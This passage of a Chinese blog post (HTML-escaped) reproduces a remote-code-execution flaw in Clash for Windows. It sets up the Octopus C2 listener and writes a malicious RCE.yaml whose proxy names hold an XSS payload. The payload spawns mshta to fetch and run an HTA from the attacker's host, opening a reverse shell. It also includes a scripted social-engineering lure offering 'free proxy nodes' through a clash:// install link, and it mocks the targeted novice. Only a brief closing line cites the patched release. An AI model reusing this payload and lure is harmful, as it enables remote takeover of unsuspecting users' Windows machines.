&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;成功安装后你会看到如下界面&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;┌─&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;askar@hackbook&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;─&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;/opt/redteaming/Octopus&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
└──╼ &lt;span class=&#34;nv&#34;&gt;$python3&lt;/span&gt; octopus.py



      ___           ___                       ___           ___         ___           ___
     /  /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;        /  /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;         ___        /  /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;        /  /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;      /__/&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;        /  /&lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    /  /::&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;      /  /:/         /  /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;     /  /::&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;      /  /::&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;     &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;      /  /:/_
   /  /:/&lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;    /  /:/         /  /:/     /  /:/&lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;    /  /:/&lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;     &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;    /  /:/ /&lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  /  /:/  &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;  /  /:/  ___    /  /:/     /  /:/  &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;  /  /:/~/:/  ___  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;  /  /:/ /::&lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt; /__/:/ &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;/__/:/  /  /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; /  /::&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   /__/:/ &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;/__/:/ /:/  /__/&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;/__/:/ /:/&lt;span class=&#34;se&#34;&gt;\:\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;/  /:/ &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;/  /:/ /__/:/&lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;/  /:/ &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\/&lt;/span&gt;:/   &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;/  /:/ &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\/&lt;/span&gt;:/~/:/
  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt; /:/   &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt; /:/  &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt; /:/   &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;:/     &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt; /:/   &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;:/ /:/
   &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\/&lt;/span&gt;:/     &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\/&lt;/span&gt;:/        &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\/&lt;/span&gt;:/     &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;     &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\/&lt;/span&gt;:/     &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /:/
    &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;:/       &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;:/          &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;    &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;:/       &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;     &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;:/        /__/:/
     &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;         &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;                     &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;         &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;       &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;         &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;


                    v1.2 stable !


 Octopus C2 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Control your shells


Octopus &amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;之后再运行只需要输入&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;python3 octopus.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;apache2&#34;&gt;Apache2&lt;/h3&gt;
&lt;p&gt;deb系&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;sudo apt install apache2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;yum系&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;sudo yum -y install httpd
sudo firewall-cmd --permanent --add-port&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;80/tcp
sudo firewall-cmd --permanent --add-port&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;443/tcp
sudo firewall-cmd --reload
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其他系统请参考&lt;a class=&#34;link&#34; href=&#34;https://httpd.apache.org/docs/2.4/install.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;官方网站&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现&#34;&gt;漏洞复现&lt;/h2&gt;
&lt;h3 id=&#34;linux攻击机器&#34;&gt;Linux(攻击机器)&lt;/h3&gt;
&lt;p&gt;在刚刚下好的Octopus目录下打开终端&lt;/p&gt;
&lt;p&gt;输入&lt;code&gt;python3 octopus.py&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;进入Octopus界面后输入如下内容&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;listen_http Linux的ip &lt;span class=&#34;m&#34;&gt;5555&lt;/span&gt; Linux的ip &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 随便起一个名字.php 名字
generate_hta 名字
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;p&gt;面向想做Hacker的&lt;strong&gt;小白&lt;/strong&gt;的提醒 &lt;strong&gt;(大佬们可以直接略过了)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;获取IP: 在终端输入&lt;code&gt;ifconfig&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;请不要&lt;strong&gt;傻瓜式抄命令&lt;/strong&gt;，这里的&lt;strong&gt;ip/名字&lt;/strong&gt;都是需要自己改的&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;现在Octopus已经开始监听了QAQ,记下Octopus给出的链接，并把这个终端放一边 &lt;strong&gt;(别关掉)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 1325; 
			flex-basis: 3180px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/clash_rce/1.png&#34; data-size=&#34;318x24&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/clash_rce/1.png&#34;
			width=&#34;318&#34;
			height=&#34;24&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/clash_rce/1_hu0562a55e3665f92b18a7212d3551942f_8236_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/clash_rce/1_hu0562a55e3665f92b18a7212d3551942f_8236_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;链接示例&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;链接示例&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在Apache站点的默认目录&lt;code&gt;/var/www/html/&lt;/code&gt;里放入我们的恶意配置文件，并命名为&lt;code&gt;RCE.yaml&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;命令如下:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;sudo vi RCE.yaml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;写入如下内容&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span class=&#34;nt&#34;&gt;port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;7890&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;socks-port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;7891&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;allow-lan&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;mode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;Rule&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;log-level&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;external-controller&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;9090&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;proxies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;a&amp;lt;img/src=&amp;#34;1&amp;#34;/onerror=eval(&amp;#39;require(&amp;#34;child_process&amp;#34;).spawn(&amp;#34;mshta&amp;#34;,[&amp;#34;Octopus的链接(记住只需要一对双引号)&amp;#34;])&amp;#39;);&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;socks5&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;127.0.0.1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;17938&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;skip-cert-verify&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;abc&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;socks5&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;127.0.0.1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;8088&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;skip-cert-verify&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;proxy-groups&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;-&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;&amp;lt;img/src=&amp;#34;1&amp;#34;/onerror=eval(&amp;#39;require(&amp;#34;child_process&amp;#34;).spawn(&amp;#34;mshta&amp;#34;,[&amp;#34;Octopus的链接&amp;#34;])&amp;#39;);&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;proxies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;a&amp;lt;img/src=&amp;#34;1&amp;#34;/onerror=eval(&amp;#39;require(&amp;#34;child_process&amp;#34;).spawn(&amp;#34;mshta&amp;#34;,[&amp;#34;Octopus的链接&amp;#34;])&amp;#39;);&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;原理：这是一个XSS漏洞，把payload放进Proxy的名字里，即可实现任意js代码执行，这里是执行指令mshta(命令) &amp;lt;Octopus生成的hta链接&amp;gt;(参数)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;按下&lt;code&gt;Esc&lt;/code&gt;键并输入&lt;code&gt;:wq&lt;/code&gt;保存并退出&lt;/p&gt;
&lt;p&gt;之后，攻击者就可以吃西瓜静等上线了&lt;/p&gt;
&lt;p&gt;诶嘿嘿= =&lt;/p&gt;
&lt;h3 id=&#34;windows某个可怜的小白的机器&#34;&gt;Windows(某个可怜的小白的机器)&lt;/h3&gt;
&lt;p&gt;PGR可是从来不欺负小白的哦 &lt;del&gt;(坏笑)&lt;/del&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;模拟社工过程：&lt;/p&gt;
&lt;p&gt;Hacker: &amp;ldquo;需要白嫖Clash节点吗QAQ???&amp;rdquo;&lt;/p&gt;
&lt;p&gt;小白: &amp;ldquo;好啊&amp;rdquo;&lt;/p&gt;
&lt;p&gt;Hacker: &amp;ldquo;这是你要的节点&lt;code&gt;clash://install-config?url=xxx&amp;amp;name=RCE&lt;/code&gt;&amp;rdquo;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;del&gt;&lt;strong&gt;咳咳，逃～～&lt;/strong&gt;&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;在Windows任意浏览器里输入&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;clash://install-config?url=http://Linux的ip/RCE.yaml&lt;span class=&#34;err&#34;&gt;&amp;amp;&lt;/span&gt;name=名字
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Tip:记得换IP和名字&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;然后在弹出的提示点&lt;code&gt;打开(Open)Clash For Windows&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 289; 
			flex-basis: 695px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/clash_rce/2.jpg&#34; data-size=&#34;672x232&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/clash_rce/2.jpg&#34;
			width=&#34;672&#34;
			height=&#34;232&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/clash_rce/2_hua885acc8b430d11c5301250d668e065f_391390_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/posts/clash_rce/2_hua885acc8b430d11c5301250d668e065f_391390_1024x0_resize_q75_box.jpg 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;提示&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;提示&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;进入&lt;code&gt;Profiles&lt;/code&gt;页面&lt;/p&gt;
&lt;p&gt;选择&lt;code&gt;你取的名字(这里是RCE).yaml&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 198; 
			flex-basis: 477px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/clash_rce/3.jpg&#34; data-size=&#34;1695x852&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/clash_rce/3.jpg&#34;
			width=&#34;1695&#34;
			height=&#34;852&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/clash_rce/3_hu8045fe0fc415d8a0347b05d041892f72_86987_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/posts/clash_rce/3_hu8045fe0fc415d8a0347b05d041892f72_86987_1024x0_resize_q75_box.jpg 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;RCE.yaml(建议实战的时候别用这名字  逃= =)&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;RCE.yaml(建议实战的时候别用这名字  逃= =)&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;切到&lt;code&gt;Proxies&lt;/code&gt;页面并点击那个&lt;code&gt;a&lt;/code&gt;(这一步不是必须的，因为这个RCE有些不稳定)&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 212; 
			flex-basis: 509px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/clash_rce/4.jpg&#34; data-size=&#34;1594x751&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/clash_rce/4.jpg&#34;
			width=&#34;1594&#34;
			height=&#34;751&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/clash_rce/4_hu4f4507ac000a93ce63b6aba3a699f6a3_52668_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/posts/clash_rce/4_hu4f4507ac000a93ce63b6aba3a699f6a3_52668_1024x0_resize_q75_box.jpg 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;嘛= =&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;嘛= =&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;成功getshell-露出恶毒的笑容&#34;&gt;成功GetShell &lt;del&gt;(露出恶毒的笑容)&lt;/del&gt;&lt;/h3&gt;
&lt;p&gt;Octopus收到了反弹的shell,可以 &lt;strong&gt;&amp;lt;为所欲为&amp;gt;&lt;/strong&gt; 了&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 185; 
			flex-basis: 445px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/clash_rce/sh.jpg&#34; data-size=&#34;1239x667&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/clash_rce/sh.jpg&#34;
			width=&#34;1239&#34;
			height=&#34;667&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/clash_rce/sh_hu22102e79db7ccd777d3f8d8bf10bc55e_106570_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/posts/clash_rce/sh_hu22102e79db7ccd777d3f8d8bf10bc55e_106570_1024x0_resize_q75_box.jpg 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;西瓜shell&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;西瓜shell&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;输入&lt;code&gt;interact 1&lt;/code&gt;即可在那台倒霉Windows上执行任意cmd指令啦.QWQ.&lt;/p&gt;
&lt;h2 id=&#34;漏洞防御&#34;&gt;漏洞防御&lt;/h2&gt;
&lt;p&gt;目前Clash官方已经发布了修复漏洞的最新版本&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/Fndroid/clash_for_windows_pkg/releases/download/0.19.10/Clash.for.Windows-0.19.10-win.7z&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;下载链接&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;ref&#34;&gt;Ref&lt;/h2&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/Fndroid/clash_for_windows_pkg/issues/2710&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/Fndroid/clash_for_windows_pkg/issues/2710&lt;/a&gt;&lt;/p&gt;
